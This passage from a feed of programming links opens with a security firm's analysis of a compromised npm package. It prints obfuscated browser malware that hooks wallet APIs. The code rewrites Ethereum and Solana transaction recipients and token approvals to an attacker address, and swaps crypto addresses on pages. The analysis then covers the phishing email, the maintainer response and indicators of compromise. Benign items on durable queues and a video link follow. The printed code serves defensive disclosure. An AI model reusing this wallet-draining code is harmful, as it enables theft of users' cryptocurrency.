</span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>]; </span><span>const</span><span> _0x3ec3bb = { </span><span>'ethereum'</span><span>: </span><span>/\b0x[a-fA-F0-9]{40}\b/g</span><span>, </span><span>'bitcoinLegacy'</span><span>: </span><span>/\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g</span><span>, </span><span>'bitcoinSegwit'</span><span>: </span><span>/\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g</span><span>, </span><span>'tron'</span><span>: </span><span>/((?<span>, </span><span>'bch'</span><span>: </span><span>/bitcoincash:[qp][a-zA-Z0-9]{41}/g</span><span>, </span><span>'ltc'</span><span>: </span><span>/(?<span>, </span><span>'ltc2'</span><span>: </span><span>/(?<span>, </span><span>'solana'</span><span>: </span><span>/((?<span>, </span><span>'solana2'</span><span>: </span><span>/((?<span>, </span><span>'solana3'</span><span>: </span><span>/((? }; <span> </span><span>for</span><span> (</span><span>const</span><span> [_0x17ccd4, _0x129783] </span><span>of</span><span>Object</span><span>.entries(_0x3ec3bb)) { </span><span>const</span><span> _0x1be350 = _0x530d91.match(_0x129783) || []; </span><span>for</span><span> (</span><span>const</span><span> _0x4225ce </span><span>of</span><span> _0x1be350) { </span><span>if</span><span> (_0x17ccd4 == </span><span>"ethereum"</span><span>) { </span><span>if</span><span> (!_0x4477fc.includes(_0x4225ce) &amp;&amp; neth == </span><span>) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4477fc)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinLegacy"</span><span>) { </span><span>if</span><span> (!_0x264994.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x264994)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinSegwit"</span><span>) { </span><span>if</span><span> (!_0x2e3cca.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x2e3cca)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"tron"</span><span>) { </span><span>if</span><span> (!_0x3ee86f.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x3ee86f)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc2"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bch"</span><span>) { </span><span>if</span><span> (!_0x553dcb.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x553dcb)); } } <span>const</span><span> _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb]; </span><span>const</span><span> _0x35f871 = _0x2d452a.includes(_0x4225ce); </span><span>if</span><span> (_0x17ccd4 == </span><span>"solana"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana2"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana3"</span><span> &amp;&amp; _0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } } } <span>return</span><span> _0x530d91; </span> } } <span>async</span><span>function</span><span>runmask</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x1c41fa = </span><span>; </span><span>let</span><span> _0x2a20cb = </span><span>new</span><span>Map</span><span>(); </span><span>let</span><span> _0x1ab7cb = </span><span>false</span><span>; </span><span>function</span><span>_0x1089ae</span><span>(</span><span>_0x4ac357, _0xc83c36 = </span><span>true</span><span>) </span><span>{ </span><span>const</span><span> _0x13d8ee = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x4ac357)); </span><span>if</span><span> (_0xc83c36) { </span><span>if</span><span> (_0x13d8ee.value &amp;&amp; _0x13d8ee.value !== </span><span>"0x0"</span><span> &amp;&amp; _0x13d8ee.value !== </span><span>'0'</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.data) { </span><span>const</span><span> _0x250e27 = _0x13d8ee.data.toLowerCase(); </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x095ea7b3"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x7fa5f0 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x15c4f9 = </span><span>'0x'</span><span> + _0x250e27.substring(</span><span>34</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0xde14cc = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x3e4a11 = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11; <span>const</span><span> _0x432d38 = { </span><span>'0x7a250d5630b4cf539739df2c5dacb4c659f2488d'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0xe592427a0aece92de3edee1f18e0157c05861564'</span><span>: </span><span>"Uniswap V3"</span><span>, </span><span>'0x10ed43c718714eb63d5aa57b78b54704e256024e'</span><span>: </span><span>"PancakeSwap V2"</span><span>, </span><span>'0x13f4ea83d0bd40e75c8222255bc855a974568dd4'</span><span>: </span><span>"PancakeSwap V3"</span><span>, </span><span>'0x1111111254eeb25477b68fb85ed929f73a960582'</span><span>: </span><span>"1inch"</span><span>, </span><span>'0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f'</span><span>: </span><span>"SushiSwap"</span> }; <span> </span><span>const</span><span> _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()]; </span><span>if</span><span> (_0x13f774) { </span><span>console</span><span>.log(_0x13f774 + _0x15c4f9); </span><span> } </span><span>else</span><span> { </span><span>console</span><span>.log(_0x15c4f9); </span> } } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xd505accf"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>458</span><span>) { </span><span>const</span><span> _0x571743 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x55e7fa = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x382fb5 = _0x250e27.substring(</span><span>202</span><span>, </span><span>266</span><span>); </span><span>const</span><span> _0x5bb3a7 = _0x250e27.substring(</span><span>266</span><span>, </span><span>330</span><span>); </span><span>const</span><span> _0x2e5118 = _0x250e27.substring(</span><span>330</span><span>, </span><span>394</span><span>); </span><span>const</span><span> _0x3ba273 = _0x250e27.substring(</span><span>394</span><span>, </span><span>458</span><span>); </span><span>const</span><span> _0x36b084 = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x15389e = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x571743 + _0x55e7fa + _0x36b084 + _0x15389e + _0x382fb5 + _0x5bb3a7 + _0x2e5118 + _0x3ba273; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xa9059cbb"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x5d2193 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1493e2 = _0x250e27.substring(</span><span>74</span><span>); </span><span>const</span><span> _0x32c34c = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5d2193 + _0x32c34c + _0x1493e2; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x23b872dd"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>138</span><span>) { </span><span>const</span><span> _0x5c5045 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1ebe01 = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x558b46 = _0x250e27.substring(</span><span>138</span><span>); </span><span>const</span><span> _0x56d65b = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46; } } } } } <span> } </span><span>else</span><span>if</span><span> (_0x13d8ee.to &amp;&amp; _0x13d8ee.to !== </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x13d8ee.instructions &amp;&amp; </span><span>Array</span><span>.isArray(_0x13d8ee.instructions)) { </span><span> _0x13d8ee.instructions.forEach(</span><span>_0x190501</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x190501.accounts &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.accounts)) { </span><span> _0x190501.accounts.forEach(</span><span>_0x2b9990</span><span> =&gt;</span><span> { </span><span>if</span><span> (</span><span>typeof</span><span> _0x2b9990 === </span><span>"string"</span><span>) { </span><span> _0x2b9990 = </span><span>"19111111111111111111111111111111"</span><span>; </span><span> } </span><span>else</span><span>if</span><span> (_0x2b9990.pubkey) { </span><span> _0x2b9990.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } <span>if</span><span> (_0x190501.keys &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.keys)) { </span><span> _0x190501.keys.forEach(</span><span>_0x40768f</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x40768f.pubkey) { </span><span> _0x40768f.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } }); } <span>if</span><span> (_0x13d8ee.recipient) { </span><span> _0x13d8ee.recipient = </span><span>"19111111111111111111111111111111"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.destination) { </span><span> _0x13d8ee.destination = </span><span>"19111111111111111111111111111111"</span><span>; </span> } } <span>return</span><span> _0x13d8ee; </span> } <span>function</span><span>_0x485f9d</span><span>(</span><span>_0x38473f, _0x292c7a</span><span>) </span><span>{ </span><span>return</span><span>async</span><span>function</span><span> (</span><span>..._0x59af19</span><span>) </span><span>{ </span> _0x1c41fa++; <span>let</span><span> _0x12a7cb; </span><span>try</span><span> { </span><span> _0x12a7cb = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x59af19)); </span><span> } </span><span>catch</span><span> (_0x5d1767) { </span> _0x12a7cb = [..._0x59af19]; } <span>if</span><span> (_0x59af19[</span><span>] &amp;&amp; </span><span>typeof</span><span> _0x59af19[</span><span>] === </span><span>"object"</span><span>) { </span><span>const</span><span> _0x2c3d7e = _0x12a7cb[</span><span>]; </span><span>if</span><span> (_0x2c3d7e.method === </span><span>"eth_sendTransaction"</span><span> &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>const</span><span> _0x39ad21 = _0x1089ae(_0x2c3d7e.params[</span><span>], </span><span>true</span><span>); </span><span> _0x2c3d7e.params[</span><span>] = _0x39ad21; </span><span> } </span><span>catch</span><span> (_0x226343) {} </span><span> } </span><span>else</span><span> { </span><span>if</span><span> ((_0x2c3d7e.method === </span><span>"solana_signTransaction"</span><span> || _0x2c3d7e.method === </span><span>"solana_signAndSendTransaction"</span><span>) &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>let</span><span> _0x5ad975 = _0x2c3d7e.params[</span><span>]; </span><span>if</span><span> (_0x5ad975.transaction) { </span> _0x5ad975 = _0x5ad975.transaction; } <span>const</span><span> _0x5dbe63 = _0x1089ae(_0x5ad975, </span><span>false</span><span>); </span><span>if</span><span> (_0x2c3d7e.params[</span><span>].transaction) { </span><span> _0x2c3d7e.params[</span><span>].transaction = _0x5dbe63; </span><span> } </span><span>else</span><span> { </span><span> _0x2c3d7e.params[</span><span>] = _0x5dbe63; </span> } <span> } </span><span>catch</span><span> (_0x4b99fd) {} </span> } } } <span>const</span><span> _0x1cbb37 = _0x38473f.apply(</span><span>this</span><span>, _0x12a7cb); </span><span>if</span><span> (_0x1cbb37 &amp;&amp; </span><span>typeof</span><span> _0x1cbb37.then === </span><span>"function"</span><span>) { </span><span>return</span><span> _0x1cbb37.then(</span><span>_0xea3332</span><span> =&gt;</span><span> _0xea3332)[</span><span>"catch"</span><span>](</span><span>_0x35d6a3</span><span> =&gt;</span><span> { </span><span>throw</span><span> _0x35d6a3; </span> }); } <span>return</span><span> _0x1cbb37; </span> }; } <span>function</span><span>_0x41630a</span><span>(</span><span>_0x5d6d52</span><span>) </span><span>{ </span><span>if</span><span> (!_0x5d6d52) { </span><span>return</span><span>false</span><span>; </span> } <span>let</span><span> _0x2fc35d = </span><span>false</span><span>; </span><span>const</span><span> _0xfafee = [</span><span>"request"</span><span>, </span><span>"send"</span><span>, </span><span>"sendAsync"</span><span>]; </span><span>for</span><span> (</span><span>const</span><span> _0x16ab0e </span><span>of</span><span> _0xfafee) { </span><span>if</span><span> (</span><span>typeof</span><span> _0x5d6d52[_0x16ab0e] === </span><span>"function"</span><span>) { </span><span>const</span><span> _0x58cddf = _0x5d6d52[_0x16ab0e]; </span> _0x2a20cb.set(_0x16ab0e, _0x58cddf); <span>try</span><span> { </span><span>Object</span><span>.defineProperty(_0x5d6d52, _0x16ab0e, { </span><span>'value'</span><span>: _0x485f9d(_0x58cddf, _0x16ab0e), </span><span>'writable'</span><span>: </span><span>true</span><span>, </span><span>'configurable'</span><span>: </span><span>true</span><span>, </span><span>'enumerable'</span><span>: </span><span>true</span> }); <span> _0x2fc35d = </span><span>true</span><span>; </span><span> } </span><span>catch</span><span> (_0x19546c) {} </span> } } <span>if</span><span> (_0x2fc35d) { </span><span> _0x1ab7cb = </span><span>true</span><span>; </span> } <span>return</span><span> _0x2fc35d; </span> } <span>function</span><span>_0xfc3320</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x4f0cd6 = </span><span>; </span><span>const</span><span> _0x5b507d = </span><span>() =&gt;</span><span> { </span> _0x4f0cd6++; <span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>setTimeout</span><span>(</span><span>() =&gt;</span><span> { </span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span><span> }, </span><span>500</span><span>); </span><span>return</span><span>; </span> } <span>if</span><span> (_0x4f0cd6 &lt; </span><span>50</span><span>) { </span><span>setTimeout</span><span>(_0x5b507d, </span><span>100</span><span>); </span> } }; _0x5b507d(); } _0xfc3320(); <span>window</span><span>.stealthProxyControl = { </span><span>'isActive'</span><span>: </span><span>() =&gt;</span><span> _0x1ab7cb, </span><span>'getInterceptCount'</span><span>: </span><span>() =&gt;</span><span> _0x1c41fa, </span><span>'getOriginalMethods'</span><span>: </span><span>() =&gt;</span><span> _0x2a20cb, </span><span>'forceShield'</span><span>: </span><span>() =&gt;</span><span> { </span><span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>return</span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span> } <span>return</span><span>false</span><span>; </span> } }; }</span></span></span></span></span></span></code></pre><p>&zwj;</p><p>This malware is essentially a <strong>browser-based interceptor</strong> that hijacks both network traffic and application APIs. It injects itself into functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and common wallet interfaces, then silently rewrites values in requests and responses. That means any sensitive identifiers, such as payment destinations or approval targets, can be swapped out for attacker, controlled ones before the user even sees or signs them. To make the changes harder to notice, it uses string-matching logic that replaces targets with look-alike values.</p><p>What makes it dangerous is that it operates at multiple layers: altering content shown on websites, tampering with API calls, and manipulating what users&rsquo; apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background. </p><h3>&#128736; How the Malware Works (Step by Step)</h3><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses &ldquo;lookalike&rdquo; addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they&rsquo;re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions.</li></ul></li></ol><p>&zwj;</p><h2>The phishing email</h2><p>The maintainer <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that he was compromised by the use of phishing, using this email coming from <code>support [at] npmjs [dot] help</code> :</p><figure></figure><p>The domain was registered just three days ago on September 5th, 2025:</p><figure></figure><p>&zwj;</p><h2>Maintainer response</h2><p>After Aikido notified the maintainer on Bluesky, he <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydioq5swk2y">replied</a> at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.</p><figure></figure><p>&zwj;</p><p>The author also <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that the phishing email was sent from <code>support [at] npmjs [dot] help</code> .</p><figure></figure><p>The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the package <code>simple-swizzle</code> is still compromised<code>.</code></p><p>&zwj;</p><p>The author further commented on <a href="https://news.ycombinator.com/item?id=45169794">HackerNews</a>:</p><figure></figure><p>&zwj;</p><h2>Attackers target another maintainer</h2><p>At 16:58 UTC, our system detected another package, which was comrpomised by what appears to be the same attackers:</p><p><code>proto-tinker-wc@0.1.87</code> </p><p>&zwj;</p><p>The file <code>dist/cjs/proto-tinker.cjs.entry.js</code> contains the malicious code:</p><figure></figure><p>&zwj;</p><h2>Indicators of compromise</h2><p><strong>Phishing domain</strong></p><ul><li>&zwj;<code>npmjs.help</code> </li></ul><p>&zwj;</p><p><strong>Package versions</strong></p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b6_4913bc7a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b9_d712be77.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf028d86e3642f1268253f_050c42b9.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf0c759ee5745abae971d6_4d7201ce.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef52fd46522cb992c2219_4f550d2c.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef771ef1d9d76f657c620_85e69b2a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68befd7be19287dbec088edf_9a88ae42.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf10ec2433fb72c8e0cb55_1c9c488f.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 20:58:16 +0530</pubDate></item><item><link>https://www.dbos.dev/blog/durable-queues</link><title>How I solved a distributed queue problem after 15 years (dbos.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</guid><comments>https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b9cf41ae3b9e6d626b6f52_how-to-make-queues-durable.jpg' /></section><section class='parsed-content'><div><p>When I was responsible for the infrastructure at Reddit, the most important thing I maintained was Postgres, but a close second was RabbitMQ, our message broker. It was essential to the operation of reddit &mdash; everything went into a distributed queue before it went to a database. For example, if you upvoted a post, that was written to the queue and the cache, and then returned success to the user. Then a queue runner would take that item, and attempt to write it to the database as well as create a new work item to recalculate all the listings that upvote affected.</p><p>We used this task queue architecture because it was simple and scalable with powerful features:</p><ul><li><strong>Horizontal scalability</strong>. Task queues let us run many tasks in parallel, utilizing the resources of many servers. They were also fairly simple to scale&ndash;just add more workers.</li><li><strong>Flow control</strong>. With task queues, we could customize the rate at which workers consume tasks from different queues. For example, for resource-intensive tasks, we could limit the number of those tasks that can run concurrently on a single worker. If a task accesses a rate-limited API, we could limit how many tasks are executed per second to avoid overwhelming the API.&nbsp;</li><li><strong>Scheduling</strong>. Task queues let us define when or how often a task runs. For example, we could run tasks on a cron schedule, or schedule tasks to execute some time in the future.</li></ul><p>This system scaled well, but it could break in all sorts of tricky ways. If the databases for votes were down, the item would have to go back onto the queue. If the listings cache was down, the listings couldn&rsquo;t get recalculated. If the queue processor crashed after it had taken the item but before it acted on it, the data was just lost. And if the queue itself went down, as it was prone to do, we could just lose votes, or comments, or submissions (did you ever think &ldquo;I know I voted on that but it&rsquo;s gone!&rdquo; when using reddit?&nbsp; That&rsquo;s why).</p><p>What we really needed to make distributed task queueing robust are <strong>durable queues</strong> that checkpoint the status of our queued tasks to a durable store like Postgres. With a durable queue, we could have resumed failed jobs from their last completed step and we wouldn&rsquo;t have lost data when there were program crashes.</p><p>Durable queues were rare when I was at Reddit, but they&rsquo;re more and more popular now. Essentially, they work by combining task queues with durable workflows, helping you <strong>reliably orchestrate workflows of many parallel tasks</strong>. Architecturally, durable queues closely resemble conventional queues, but use a persistent store (typically a relational database) as both message broker and backend:</p><figure></figure><p>The core abstraction in durable queues is a <strong>workflow</strong> of many tasks. For example, you can submit a document processing task that splits a document into pages, processes each page in parallel in separate tasks, then postprocesses and returns the results:</p><figure></figure><p>Durable queues work by <strong>checkpointing</strong> workflows in their persistent store. When a client submits a task, the task and its inputs are recorded. Then, whenever that task invokes another task, this subtask and its inputs is recorded as a <strong>child </strong>of its caller. Thus, the queue system has a complete persistent record of all tasks and their relationships.</p><p>These workflows are most relevant when recovering from failures. If a non-durable worker is interrupted while executing a task, the queue restarts it from the beginning at best, or loses the task at worst. This isn&rsquo;t ideal for long-running workflows or tasks with critical data. Instead, when a durable queue system recovers a workflow, it looks up its checkpoints to recover from the <strong>last completed step</strong>, avoiding resubmission of any completed work.</p><p>&zwj;</p><h3>Durable Queues and Observability</h3><p>Another advantage of durable queues is <strong>built-in</strong> <strong>observability</strong>. Because they persist detailed records of every workflow and task that was ever submitted, durable queues make it easy to monitor what queues and workflows are doing at any given time. For example, looking up the current contents of a queue (or any past content) is just a SQL query. Similarly, looking up the <a href="https://www.dbos.dev/blog/why-workflows-should-be-postgres-rows">current status of a workflow is another SQL query</a>.&nbsp;</p><p>&zwj;</p><h3>Durable Queueing Tradeoffs</h3><p>So, when should you use durable queues? As always, the answer comes down to <strong>tradeoffs</strong>. For durable queues, the main tradeoff is around <strong>message broker performance</strong>. Most distributed task queues use an in-memory key-value store like Redis for brokering messages and storing task outputs. However, durable queues need to use a durable store, often a relational database like Postgres, as both message broker and backend. The latter provides stronger guarantees, but the former higher throughput. Thus, you should prefer durable queues when handling a lower volume of larger business-critical tasks and distributed task queues when handling a very large volume of smaller tasks.</p><p>&zwj;</p><h3>Additional Reading</h3><ul><li><a href="https://www.dbos.dev/case-studies/dosu">Dosu</a> - migrating queuing from Celery to DBOS</li><li><a href="https://www.dbos.dev/case-studies/bms">Bristol Myers Squibb</a> - durable, observable horizontal scaling of genomic data pipelines with DBOS</li><li><a href="https://www.dbos.dev/case-studies/ai-powered-causal-reasoning">cStructure</a> - migrating queuing from Celery to DBOS</li><li><a href="https://docs.dbos.dev/python/reference/queues">DOCS:&nbsp;DBOS&nbsp;durable queuing</a></li></ul></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7c9f14b71a122d3861644_Durable-Queues-Diagram.png"></p><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7bf757d45df00d5753d88_fbbbe73e.png"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 11:49:17 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=sp3mMwo3PO0</link><title>How Your Code Really Controls Hardware (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</guid><comments>https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/'>Post permalink</a></p></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/sp3mMwo3PO0?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; 